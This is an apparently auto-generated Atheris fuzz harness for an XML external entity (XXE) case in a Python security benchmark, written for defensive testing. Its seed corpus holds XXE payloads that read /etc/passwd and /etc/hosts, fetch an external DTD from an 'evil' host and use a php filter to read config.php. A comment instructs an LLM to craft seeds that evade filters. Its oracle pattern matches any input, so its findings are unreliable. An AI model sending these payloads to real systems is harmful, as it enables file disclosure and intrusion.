# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xxe
# function : BenchmarkTest00930_post
# file     : testcode/BenchmarkTest00930.py
# ================================================================
import atheris
import sys
import re
import os


from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/tuonglnc/repo/VulnHunterX/repos/python/benchmark-python"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00930 import BenchmarkTest00930_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("[\\s\\S]+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "ORACULUM_VIOLATION: captured={captured}"
_TAINTED_PARAMS = [{"name": "request", "index": -1, "type": "flask_request"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : xml.etree.ElementTree.xml.etree.ElementTree.fromstring
# target_arg_index : None
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def BenchmarkTest00930_post()
# condition        : oracle condition
# capture_what     : captured value
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `xml.etree.ElementTree.xml.etree.ElementTree.fromstring` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[None] first,
#      fall back to call.kwargs.get("None").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # 1. INPUT GENERATION
    # Only one tainted param: "request" of type flask_request
    # For flask_view strategy, we simulate a POST request with a body
    request_body = fdp.ConsumeUnicodeNoSurrogates(fdp.remaining_bytes())
    
    # Create a mock Flask request object
    class MockRequest:
        def __init__(self, data):
            self.data = data.encode('utf-8') if isinstance(data, str) else data
            self.method = 'POST'
            self.content_type = 'application/xml'
            self.headers = {}
    
    mock_request = MockRequest(request_body)
    
    # 2. SKIP CONDITION
    # skip_hint is False, so we don't skip
    
    # 3. MOCK SETUP
    with patch('xml.etree.ElementTree.fromstring', return_value=MagicMock()) as mock_get:
        try:
            # Temporarily replace the global request object
            import flask
            original_request = flask.request if hasattr(flask, 'request') else None
            flask.request = mock_request
            
            # Call the target function
            BenchmarkTest00930_post()
            
            # Restore the original request
            if original_request is not None:
                flask.request = original_request
            else:
                delattr(flask, 'request')
                
        except Exception:
            # Restore the original request before returning
            if original_request is not None:
                flask.request = original_request
            elif hasattr(flask, 'request'):
                delattr(flask, 'request')
            return
    
    # 4. ORACLE CHECK
    for call in mock_get.call_args_list:
        # Get the captured argument
        captured = None
        if call.args:
            captured = call.args[0]  # First positional argument
        elif call.kwargs:
            captured = call.kwargs.get('text')  # Fallback to keyword argument if exists
            
        if captured is not None:
            # Check against all patterns
            for pattern in _COMPILED_PATTERNS:
                if pattern.match(str(captured)):
                    raise RuntimeError(_RAISE_MESSAGE.format(captured=captured))
    
    # 5. EXCEPTION HANDLING
    # RuntimeError is allowed to propagate (oracle signal)
    # Other exceptions are already handled above


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
    "<root><![CDATA[<script>alert(1)</script>]]></root>",
    "<test xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/hosts\"/></test>",
    "<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com/evil.dtd\"> ]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>&lt;script&gt;alert(1)&lt;/script&gt;</root>",
    "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=config.php\"> ]><foo>%xxe;</foo>"
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/benchmark-python/fuzz_corpus/py_xxe_testcode_BenchmarkTest00930_py_56"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()